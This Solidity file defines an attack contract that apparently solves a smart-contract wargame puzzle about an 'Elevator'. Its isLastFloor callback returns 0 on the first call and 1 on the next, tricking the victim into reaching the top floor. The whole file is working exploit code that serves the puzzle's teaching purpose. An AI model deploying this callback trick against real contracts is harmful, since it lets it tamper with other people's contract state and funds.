// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack is Ownable {
    address public victimContract;
    bool public entered;

    constructor(address addr) {
        victimContract = addr;
    }

    function attack() external onlyOwner {
        IElevator(victimContract).goTo(5);
    }

    function isLastFloor(uint256) external returns (uint256) {
        if (msg.sender != victimContract) revert();

        if (!entered) {
            entered = true;

            return 0;
        } else {
            return 1;
        }
    }
}
